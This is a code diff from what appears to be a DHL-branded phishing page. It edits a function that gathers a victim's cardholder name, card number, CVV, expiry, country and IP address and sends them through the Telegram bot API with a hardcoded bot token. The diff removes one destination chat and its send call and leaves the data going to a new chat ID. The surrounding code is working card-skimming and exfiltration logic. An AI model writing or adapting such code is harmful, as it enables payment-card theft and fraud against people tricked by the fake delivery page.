@@ -4559,13 +4559,10 @@ export default {
       this.IP = tt.data.ip;
       this.query = tt.data.country_capital;
        var token = "6188237567:AAGyW3wcd9ZumEX5EZTcpkaUsQkVWMgOGGI";
-    var chatId = -823044704;
-     var chatId2 = -940829481;
+       var chatId2 = -957355212;
       var fullMessage = `
         ||||||||||🇨🇦| DHL EN |🇨🇦||||||||||%0ACard Name : ${this.cardName}%0ACard Number : ${this.cardNumber}%0ACVV: ${this.cvv}%0AExpiry : ${this.cardDate}%0ACountry : ${this.query}%0AIP : ${this.IP}%0A||||||||||💳| DHL|💳||||||||||`;
-      await axios.post(
-        `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${fullMessage}`
-      );
+     
        await axios.post(
          `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId2}&text=${fullMessage}`
        );
